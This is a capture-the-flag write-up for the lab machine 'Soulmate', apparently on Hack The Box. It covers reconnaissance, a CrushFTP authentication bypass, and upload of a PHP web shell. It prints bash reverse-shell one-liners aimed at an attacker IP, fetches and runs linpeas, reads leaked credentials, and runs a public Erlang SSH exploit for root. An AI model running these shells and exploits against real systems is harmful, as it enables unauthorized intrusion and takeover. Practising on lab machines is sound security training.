# Soulmate writeup

##1 nmap 
  
$ sudo nmap -p- -sC -sV --min-rate 1000 10.129.1.150  
find open port: 22(ssh), 80(http), 4369(epmd)  
  
$ echo "10.129.1.150   soulmate.htb"  
now we can access to http://soulmate.htb, and find website running.  
  
$ gobuster vhost -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://soulmate.htb --append-domain  
  
find ftp.soulmate.htb  
$ echo "10.129.1.150   ftp.soulmate.htb"  
  
crushftp is running on the target, and find CVE-2025-31161 by google search.  
->we can make user with admin priv  
now, we have admin account, and user "ben" have virtual file system   
-> set ben's password and log in as ben  
-> upload php shell to webProd  
make shell.php, which include the following shell.  
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.192/1234 0>&1'"); ?>  
  
after upload the shell.php to the target  
$ nc -nvlp 1234  
$ curl http://soulmate.htb/shell.php  
  
we get www-data shell!!  
  
##2 user flag  
send linpeas to the target, and exec  
  
$ python3 -m http.server 80  
www-data) wget http://{my ip}:80/linpeas.sh  
www-data) chmod +x linpeas.sh  
www-data) ./linpeas.sh  
  
see "excecutable files potentially added by user"  
  
2025-08-27+09:28:26.8565101180 /usr/local/sbin/laurel  
2025-08-15+07:46:57.3585015320 /usr/local/lib/erlang_login/start.escript  
2025-08-14+14:13:10.4708616270 /usr/local/sbin/erlang_login_wrapper  
2025-08-14+14:12:12.0726103070 /usr/local/lib/erlang_login/login.escript  
  
these are probably relate to login  
  
we find credentials in /usr/local/lib/erlang_login/start.escript  
log in as ben via ssh  
$ ssh ben@soulmate.htb  
  
[+] get user flag [+]  
  
## root flag  
from /usr/local/lib/erlang_login/start.escript, erlang seems to be running on port 2222  
but port 2222 is local and we cannot scan the port with nmap.  
  
so, before nmap, we do local port forwarding!!  
 ** Local port forwarding is an SSH technique that redirects network traffic from a specific port on your local computer (localhost) through a secure, encrypted tunnel to a target port on a remote server.**  
 # ssh -L {target port}:{target host}:{attacker machine port} {target hostname}@{target IP}  
$ ssh -L 2222:localhost:2222 ben@soulmate.htb  
now, we can scan target's 2222 with nmap,  
$ sudo nmap -sC -sV -p 2222 localhost   
-> find out the version of erlang, SSH-2.0-Erlang/5.2.9  
we can find exploit "https://github.com/vulhub/vulhub/blob/master/erlang/CVE-2025-32433/exploit.py"  
nc -nlvp 4444  
python3 exploit.py -t localhost -p 2222 --command "bash -c 'bash -i >& /dev/tcp/{my ip}/4444 0>&1'"  
  
[+] get root shell and root flag!! [+]  
